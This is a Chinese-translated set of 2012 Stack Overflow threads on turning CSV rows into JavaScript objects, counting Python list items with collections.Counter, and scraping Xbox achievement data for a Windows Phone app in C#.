我之前没有看到有人将[FragmentTransaction](http://developer.android.com/reference/android/app/FragmentTransaction.html)放入`try`块中，并且您调用的函数不会抛出任何东西（根据文档）。你的`catch`街区甚至可以到达吗？

您的方法的名称是`hide()`. 显示和隐藏您的片段，而不是添加或删除它就足够了吗？

# javascript - 从 CSV 动态创建对象

> ID：11786995
> 
> 赞同：1
> 
> 时间：2012-08-02T22:55:59.517
> 
> 标签：javascript, node.js, csv

我正在尝试做的是动态创建一个具有动态属性的对象文字。

我有一个包含文件内容（CSV 格式）的数组。

每个元素都是一行（内容用 分割`/\r?\n/`）。

该数组的第一个元素（第一行）包含我想要用于对象文字的参数，以逗号分隔。

所有其他元素都是第一行中设置的参数的值（仍然是 CSV 格式）。

我目前拥有的代码如下：

```
function jsonDataArray(array) {
    var jsonResult = [],
        parameters = [],
        values;
    for(var i=0; i < array.length; i++) {
        if(i === 0) {
            var parameters = array[i].split(',');
            var objJSON = {};
            for(var k=0; k < parameters.length; k++) {
                objJSON.eval(parameters[k]);
            }
            continue;
        }
        values = array[i].split(',')
        for(var j=0; j < objJSON.length; j++) {
            objJSON[j] = values;
        }
        jsonResult.push(objJSON);
    }
    return jsonResult;
} 
```

现在，当我在节点中启动此代码时，该`objJSON.eval(parameters[k])`行似乎是问题所在，但我无法解决问题。

所以基本上我的问题如下：

*   我应该如何继续将第一行中的参数设置为 JSON 对象的参数 + 填充其他行的值？

*   用这个解析新行是否安全：`/\r?\n/`？

预先感谢您的帮助 ！

编辑：我错误地使用术语 JSON 来表示对象文字，所以我更正了这个问题。虽然我没有修改函数，所以我不会错误地在代码中添加错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T23:11:02.527

在我看来，您需要一个对象数组，每个对象都有第一行的键（标题）。

以下代码假设您已经通过`\r?\n`

```
(function() {
  var csv = [];
      csv.push('name,age,gender');
      csv.push('jake,13,m');
      csv.push('sarah,15,f');
      csv.push('john,18,m');
      csv.push('nick,13,m');

  console.log(csv);

  function jsonDataArray(array) {
    var headers = array[0].split(',');
    var jsonData = [];
    for ( var i = 1, length = array.length; i < length; i++ )
    {
      var row = array[i].split(',');
      var data = {};
      for ( var x = 0; x < row.length; x++ )
      {
        data[headers[x]] = row[x];
      }
      jsonData.push(data);

    }

    return jsonData;
  }

  console.log(jsonDataArray(csv));

})(); 
```

[http://jsbin.com/igiwor/2/edit](http://jsbin.com/igiwor/2/edit)

这将产生如下内容：

```
[{ name="jake",  age="13",  gender="m"},
{ name="sarah",  age="15",  gender="f"}, 
{ name="john",  age="18",  gender="m"},
{ name="nick"  age="13",  gender="m"}] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T23:16:05.367

这是我的 CSV 解析函数，希望对您有所帮助：

```
function parseCSV(input) {
    var rows = input.split(/\r?\n/);
    var keys = rows.shift().split(",");
    return rows.map(function(row) {
        return row.split(",").reduce(function(map, val, i) {
            map[keys[i]] = val;
            return map;
        }, {});
    });
} 
```

> 我应该如何继续将第一行的参数设置为 JSON 对象的参数 + 填充其他行的值？

只需遍历这些值。然后，`values[i]`添加到的键`object`是`parameters[i]`。在我的版本中，这是行`map[keys[i]] = val;`

> 用这个解析新行是否安全：`/\r?\n/`？

我想是的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T23:10:54.380

我认为您可以只说以下内容，但我不确定`<somevalue>`应该是什么。

```
 objJSON[parameters[k]] = <somevalue>; 
```

在任何情况下，请考虑以下事项，

```
var anObj = {};

anObj["a1"] = "sam";
anObj["a2"] = 5; 
```

这与

```
var anObj = { a1 : "sam", a2 : 5 }; 
```

# python - 列表 - 如何查找项目出现的次数

> ID：11786997
> 
> 赞同：1
> 
> 时间：2012-08-02T22:56:00.493
> 
> 标签：python

> **可能重复：**
> [如何计算 Python 中列表项的出现次数？](https://stackoverflow.com/questions/2600191/how-to-calculate-the-occurrences-of-a-list-item-in-python)

我正在进行一项民意调查。为此，我正在使用 Python，而我坚持的部分是试图弄清楚如何计算某件事的次数，比如“General Store”出现。

例如民意调查：

你在哪里看到的广告最多？

1.  杂货店

2.  超级市场

3.  购物中心

4.  小商店

如果需要该信息，则通过单选按钮提交投票数据。所有这些答案都将附加到一个列表中，然后我想创建一个结果页面，显示每件事的投票次数。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-02T23:07:34.990

这有效：

```
>>> from collections import Counter
>>> data = ['Store', 'Office', 'Store', 'Office', 'Home', 'Nowhere']
>>> Counter(data)
Counter({'Office': 2, 'Store': 2, 'Home': 1, 'Nowhere': 1}) 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T23:07:38.840

首先，我要说您可能为您的投票结果问题使用了错误的解决方案。为什么不为每个选项保留一个计数器，这样，您的文件或您用来存储此数据的任何后端都不会随着响应的到来而线性增长。

这样做会更容易的原因是因为无论如何您都将创建计数器，唯一的区别是每次加载响应页面时您都必须计算所有项目。

```
#initializing a variable with some mock poll data
option1 = "general store"
option2 = "supermarket"
option3 = "mall"
option4 = "small store"

sample_data = [option1,option2,option1,option1,option3,option3,option4,option4,option4,option2]

#a dict that will store the poll results
results = {}

for response in sample_data:
    results[response] = results.setdefault(response, 0) + 1 
```

现在，结果会将列表中出现的每个字符串作为键，并将它出现的次数作为它的值。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-02T22:57:42.853

你会想要使用[`collections.Counter`](http://docs.python.org/library/collections.html#collections.Counter)

和`.most_common`方法。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-02T23:08:19.727

对于 Python 2.7+，您可以使用[`collections.Counter`](http://docs.python.org/library/collections.html#collections.Counter)

```
>>> from collections import Counter
>>> l = ['hello','hello','hello','there','foo','foo','bar']
>>> Counter(l).most_common()
[('hello', 3), ('foo', 2), ('there', 1), ('bar', 1)] 
```

如果你不在 2.7 上，你可以这样做：

```
>>> s = set(l)
>>> d = {}
>>> for i in s:
...    d[i] = l.count(i)
... 
>>> d
{'there': 1, 'bar': 1, 'hello': 3, 'foo': 2} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-02T22:59:44.573

如果你有一个列表，你可以做

```
ls = ["Mall", "Mall", "Supermarket"]
ls.count("Mall")
>>> 2
ls.count("General Store")
>>> 0 
```

# c# - 从网站读取信息

> ID：11786999
> 
> 赞同：0
> 
> 时间：2012-08-02T22:56:26.587
> 
> 标签：c#, xml, windows-phone-7, webclient

我正在为那些 Xbox 360 成就爱好者构建一个应用程序。现在我几乎将标题、描述和指南复制到一个 XML 文件（我的 Dropbox 中有）。然后我将此信息检索到 3 个文本块和一个图像控件。

过程：

步骤1：

找到标题： http: [//www.xbox360achievements.org/game/call-of-duty-modern-warfare-3/guide/](http://www.xbox360achievements.org/game/call-of-duty-modern-warfare-3/guide/)

第2步：

将所有信息复制并粘贴到 XML：[https ://dl.dropbox.com/u/27136243/AchivementHunters/XML/Achivements%26Guides%20-%20Example.xml](https://dl.dropbox.com/u/27136243/AchivementHunters/XML/Achivements%26Guides%20-%20Example.xml)

第 3 步：

下载 XML 并读取/显示数据

```
 XDocument dataFeed = XDocument.Parse(e.Result);
        try
        {
            if (NavigationContext.QueryString.TryGetValue("gameName", out gameName))
            {
                AchivementsListBox.ItemsSource = from query in dataFeed.Descendants(gameName)
                                                 select new NewGamesClass
                                                 {
                                                     TitleCode = (string)query.Element("TitleCode"),
                                                     GameTitle = (string)query.Element("Title"),
                                                     GameDescription = (string)query.Element("Description"),
                                                     GameGuide = (string)query.Element("Guide"),
                                                     GameImage = (string)query.Element("Image"),
                                                     GameVideoLink = (string)query.Element("VideoLink")
                                                 };
            }
        }
        catch
        {
            MessageBox.Show("Sorry, an error has ocurr while locating the achievement list.");
        } 
```

输出：

![在此处输入图像描述](../Images/fe51f32aca4ada7724f08d7f689e8ea3.png) ![在此处输入图像描述](../Images/bb4f4d05ccd8276fee3ce48c21fb1fb6.png)

现在，我想通过不手动查找、复制和粘贴所有数据来让我的生活更轻松。无论如何，我可以直接从网站访问所有这些信息并将其显示在我的应用程序中。我还在学习编程的过程中，所以我不知道要研究什么来完成这个。有人可以指导我走向正确的道路，并给我一些例子。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T23:11:12.687

您可能想研究使用[HtmlAgilityPack](http://htmlagilitypack.codeplex.com/)框架。我以前曾将它用于 Windows Phone 7 开发，并且效果很好。这个框架上有很多[例子](https://stackoverflow.com/questions/846994/how-to-use-html-agility-pack)（[另一个](http://htmlagilitypack.codeplex.com/wikipage?title=Examples)）。

但是，您正在收集（抓取）这些数据的网站上可能存在使用条件，您应该在继续并投入过多工作之前对其进行调查。

希望有帮助。